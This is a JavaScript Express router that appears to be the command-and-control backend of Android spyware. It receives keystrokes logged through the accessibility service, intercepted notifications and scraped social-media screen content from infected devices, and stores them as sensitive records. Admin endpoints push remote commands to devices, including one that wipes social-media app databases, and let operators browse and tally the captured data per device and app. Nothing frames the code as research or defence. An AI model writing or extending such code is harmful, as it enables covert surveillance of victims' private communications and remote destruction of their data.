const express = require('express');
const { Op } = require('sequelize');
const { Device, AccessibilityData } = require('../config/database');
const { authenticateToken, authenticateDevice, requireAdmin } = require('../middleware/auth');
const logger = require('../utils/logger');

const router = express.Router();

// Submit accessibility keylogger data (Device endpoint)
router.post('/keylogger', authenticateDevice, async (req, res) => {
  try {
    const device = await Device.findOne({ where: { device_id: req.deviceId } });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const { keystrokes, app_package, app_name, window_title, timestamp } = req.body;
    
    const accessibilityData = await AccessibilityData.create({
      device_id: device.id,
      data_type: 'keylogger',
      app_package,
      app_name,
      window_title,
      keystrokes,
      timestamp: timestamp ? new Date(timestamp) : new Date(),
      is_sensitive: true
    });

    logger.info(`Accessibility keylogger data received from device: ${req.deviceId}`);

    // Emit to admin room
    if (req.io) {
      req.io.to('admin-room').emit('accessibility-data', {
        device_id: req.deviceId,
        type: 'keylogger',
        app_package
      });
    }

    res.json({
      success: true,
      message: 'Keylogger data processed successfully',
      data: { id: accessibilityData.id }
    });
  } catch (error) {
    logger.error('Submit accessibility keylogger error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Submit accessibility notifications data (Device endpoint)
router.post('/notifications', authenticateDevice, async (req, res) => {
  try {
    const device = await Device.findOne({ where: { device_id: req.deviceId } });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const { notifications } = req.body;
    if (!Array.isArray(notifications) || notifications.length === 0) {
      return res.status(400).json({
        success: false,
        error: 'Invalid notifications data'
      });
    }

    const notificationData = notifications.map(notif => ({
      device_id: device.id,
      data_type: 'notifications',
      app_package: notif.app_package,
      app_name: notif.app_name,
      notification_title: notif.title,
      notification_text: notif.text,
      notification_key: notif.key,
      timestamp: notif.timestamp ? new Date(notif.timestamp) : new Date(),
      metadata: notif.metadata
    }));

    const createdNotifications = await AccessibilityData.bulkCreate(notificationData);

    logger.info(`Accessibility notifications received from device: ${req.deviceId}, count: ${notifications.length}`);

    // Emit to admin room
    if (req.io) {
      req.io.to('admin-room').emit('accessibility-data', {
        device_id: req.deviceId,
        type: 'notifications',
        count: createdNotifications.length
      });
    }

    res.json({
      success: true,
      message: `${createdNotifications.length} notifications processed successfully`,
      data: { count: createdNotifications.length }
    });
  } catch (error) {
    logger.error('Submit accessibility notifications error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Submit social media accessibility data (Device endpoint)
router.post('/social-media', authenticateDevice, async (req, res) => {
  try {
    const device = await Device.findOne({ where: { device_id: req.deviceId } });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const { social_data } = req.body;
    if (!Array.isArray(social_data) || social_data.length === 0) {
      return res.status(400).json({
        success: false,
        error: 'Invalid social media data'
      });
    }

    const socialMediaData = social_data.map(data => ({
      device_id: device.id,
      data_type: 'social_media',
      app_package: data.app_package,
      app_name: data.app_name,
      content_text: data.content_text,
      content_description: data.content_description,
      class_name: data.class_name,
      view_id: data.view_id,
      coordinates: data.coordinates,
      screenshot_path: data.screenshot_path,
      timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
      metadata: data.metadata,
      is_sensitive: true
    }));

    const createdData = await AccessibilityData.bulkCreate(socialMediaData);

    logger.info(`Social media accessibility data received from device: ${req.deviceId}, count: ${social_data.length}`);

    // Emit to admin room
    if (req.io) {
      req.io.to('admin-room').emit('accessibility-data', {
        device_id: req.deviceId,
        type: 'social_media',
        count: createdData.length
      });
    }

    res.json({
      success: true,
      message: `${createdData.length} social media entries processed successfully`,
      data: { count: createdData.length }
    });
  } catch (error) {
    logger.error('Submit social media accessibility error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Run accessibility command (Admin command)
router.post('/command', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { device_id, command_type, command_data } = req.body;

    const device = await Device.findByPk(device_id);
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const Command = require('../config/database').Command;
    const command = await Command.create({
      device_id: device.id,
      command_type: 'run_accessibility_command',
      command_data: {
        accessibility_command: command_type,
        ...command_data
      },
      priority: 'normal',
      created_by: req.user.id,
      expires_at: new Date(Date.now() + 60 * 60 * 1000) // 1 hour
    });

    // Emit to device room
    if (req.io) {
      req.io.to(`device-${device.device_id}`).emit('new-command', {
        command: command.toJSON()
      });
    }

    res.json({
      success: true,
      message: 'Accessibility command sent',
      data: { command_id: command.id }
    });
  } catch (error) {
    logger.error('Accessibility command error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Nuke social media database (Admin command)
router.post('/nuke-social-media', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { device_id, app_packages } = req.body;

    const device = await Device.findByPk(device_id);
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const Command = require('../config/database').Command;
    const command = await Command.create({
      device_id: device.id,
      command_type: 'accessibility_nuke_social_media_database',
      command_data: {
        app_packages: app_packages || []
      },
      priority: 'high',
      created_by: req.user.id,
      expires_at: new Date(Date.now() + 60 * 60 * 1000) // 1 hour
    });

    // Emit to device room
    if (req.io) {
      req.io.to(`device-${device.device_id}`).emit('new-command', {
        command: command.toJSON()
      });
    }

    res.json({
      success: true,
      message: 'Social media database nuke command sent',
      data: { command_id: command.id }
    });
  } catch (error) {
    logger.error('Nuke social media command error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Get accessibility data for device (Admin only)
router.get('/data/device/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 100, data_type, app_package, from, to, is_sensitive } = req.query;
    const offset = (page - 1) * limit;

    const device = await Device.findByPk(req.params.deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const whereClause = { device_id: device.id, is_deleted: false };
    
    if (data_type) {
      whereClause.data_type = data_type;
    }

    if (app_package) {
      whereClause.app_package = app_package;
    }

    if (is_sensitive !== undefined) {
      whereClause.is_sensitive = is_sensitive === 'true';
    }

    if (from || to) {
      whereClause.timestamp = {};
      if (from) whereClause.timestamp[Op.gte] = new Date(from);
      if (to) whereClause.timestamp[Op.lte] = new Date(to);
    }

    const { count, rows: data } = await AccessibilityData.findAndCountAll({
      where: whereClause,
      limit: parseInt(limit),
      offset: parseInt(offset),
      order: [['timestamp', 'DESC']]
    });

    res.json({
      success: true,
      data: {
        accessibility_data: data,
        pagination: {
          current_page: parseInt(page),
          total_pages: Math.ceil(count / limit),
          total_count: count,
          per_page: parseInt(limit)
        }
      }
    });
  } catch (error) {
    logger.error('Get accessibility data error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

// Get accessibility statistics (Admin only)
router.get('/stats/device/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const totalEntries = await AccessibilityData.count({
      where: { device_id: device.id, is_deleted: false }
    });

    const dataTypeStats = await AccessibilityData.findAll({
      attributes: [
        'data_type',
        [require('sequelize').fn('COUNT', require('sequelize').col('id')), 'count']
      ],
      where: { device_id: device.id, is_deleted: false },
      group: ['data_type']
    });

    const appStats = await AccessibilityData.findAll({
      attributes: [
        'app_package',
        'app_name',
        [require('sequelize').fn('COUNT', require('sequelize').col('id')), 'count']
      ],
      where: { device_id: device.id, is_deleted: false },
      group: ['app_package', 'app_name'],
      order: [[require('sequelize').literal('count'), 'DESC']],
      limit: 10
    });

    const sensitiveCount = await AccessibilityData.count({
      where: { device_id: device.id, is_sensitive: true, is_deleted: false }
    });

    res.json({
      success: true,
      data: {
        total_entries: totalEntries,
        sensitive_entries: sensitiveCount,
        data_type_stats: dataTypeStats,
        app_stats: appStats
      }
    });
  } catch (error) {
    logger.error('Get accessibility stats error:', error);
    res.status(500).json({
      success: false,
      error: 'Server error'
    });
  }
});

module.exports = router;
